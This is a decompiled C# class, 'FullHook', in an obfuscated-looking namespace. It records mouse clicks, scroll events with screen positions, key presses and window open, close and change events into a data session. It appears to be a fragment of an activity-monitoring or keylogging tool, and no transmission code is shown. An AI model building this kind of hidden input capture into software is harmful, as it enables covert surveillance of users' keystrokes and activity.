using System;
using System.Drawing;
using System.Windows.Forms;

namespace Xh0kO1ZCmA
{
	public class FullHook : IDisposable
	{
		private MouseHook MouseListener;

		private DataSession CurrentDataSession;

		public FullHook()
		{
		}

		public void Dispose()
		{
			this.DropAll();
		}

		private void DropAll()
		{
			this.UnSetAllConnection();
			if (this.MouseListener != null)
			{
				this.MouseListener.Dispose();
				this.MouseListener = null;
			}
		}

		private void KeyDown(Keys Key)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddKeyboradEvent(Key);
			}
		}

		private void Mouse_Left_DoubleClick(Point ptLocat)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddMouseEvent(FullHook.MouseState.DL, ptLocat);
			}
		}

		private void Mouse_Left_Down(Point ptLocat)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddMouseEvent(FullHook.MouseState.L, ptLocat);
			}
		}

		private void Mouse_Middle_DoubleClick(Point ptLocat)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddMouseEvent(FullHook.MouseState.DM, ptLocat);
			}
		}

		private void Mouse_Middle_Down(Point ptLocat)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddMouseEvent(FullHook.MouseState.M, ptLocat);
			}
		}

		private void Mouse_Right_DoubleClick(Point ptLocat)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddMouseEvent(FullHook.MouseState.DR, ptLocat);
			}
		}

		private void Mouse_Right_Down(Point ptLocat)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddMouseEvent(FullHook.MouseState.R, ptLocat);
			}
		}

		private void Mouse_Wheel(Point ptLocat, MouseHook.Wheel_Direction Direction)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddScrolEvent(Direction, ptLocat);
			}
		}

		public void NewDataSession(ref DataSession _NewData)
		{
			this.CurrentDataSession = _NewData;
		}

		private void SetAllConnections(ref DataSession _DataSession)
		{
			this.CurrentDataSession = _DataSession;
			this.MouseListener.Mouse_Left_Down += new MouseHook.Mouse_Left_DownEventHandler(this.Mouse_Left_Down);
			this.MouseListener.Mouse_Left_DoubleClick += new MouseHook.Mouse_Left_DoubleClickEventHandler(this.Mouse_Left_DoubleClick);
			this.MouseListener.Mouse_Right_Down += new MouseHook.Mouse_Right_DownEventHandler(this.Mouse_Right_Down);
			this.MouseListener.Mouse_Right_DoubleClick += new MouseHook.Mouse_Right_DoubleClickEventHandler(this.Mouse_Right_DoubleClick);
			this.MouseListener.Mouse_Middle_Down += new MouseHook.Mouse_Middle_DownEventHandler(this.Mouse_Middle_Down);
			this.MouseListener.Mouse_Middle_DoubleClick += new MouseHook.Mouse_Middle_DoubleClickEventHandler(this.Mouse_Middle_DoubleClick);
			this.MouseListener.Mouse_Wheel += new MouseHook.Mouse_WheelEventHandler(this.Mouse_Wheel);
		}

		public void Start(ref Control InvokeBy, DataSession _DataSiosn)
		{
			this.DropAll();
			this.MouseListener = new MouseHook();
			this.SetAllConnections(ref _DataSiosn);
		}

		public void StopAll()
		{
			this.DropAll();
		}

		private void UnSetAllConnection()
		{
			if (this.MouseListener != null)
			{
				this.MouseListener.Mouse_Left_Down -= new MouseHook.Mouse_Left_DownEventHandler(this.Mouse_Left_Down);
				this.MouseListener.Mouse_Left_DoubleClick -= new MouseHook.Mouse_Left_DoubleClickEventHandler(this.Mouse_Left_DoubleClick);
				this.MouseListener.Mouse_Right_Down -= new MouseHook.Mouse_Right_DownEventHandler(this.Mouse_Right_Down);
				this.MouseListener.Mouse_Right_DoubleClick -= new MouseHook.Mouse_Right_DoubleClickEventHandler(this.Mouse_Right_DoubleClick);
				this.MouseListener.Mouse_Middle_Down -= new MouseHook.Mouse_Middle_DownEventHandler(this.Mouse_Middle_Down);
				this.MouseListener.Mouse_Middle_DoubleClick -= new MouseHook.Mouse_Middle_DoubleClickEventHandler(this.Mouse_Middle_DoubleClick);
				this.MouseListener.Mouse_Wheel -= new MouseHook.Mouse_WheelEventHandler(this.Mouse_Wheel);
			}
		}

		private void WindowsClosed(string WindowsName, string ProssName)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddWinEvent(FullHook.WinState.C, WindowsName, ProssName);
			}
		}

		private void WindowsModifed(string WindowsName, string ProssName)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddWinEvent(FullHook.WinState.M, WindowsName, ProssName);
			}
		}

		private void WindowsOpend(string WindowsName, string ProssName)
		{
			if (this.CurrentDataSession != null)
			{
				this.CurrentDataSession.AddWinEvent(FullHook.WinState.O, WindowsName, ProssName);
			}
		}

		public enum MouseState
		{
			L,
			DL,
			R,
			DR,
			M,
			DM
		}

		public enum WinState
		{
			O,
			C,
			M
		}
	}
}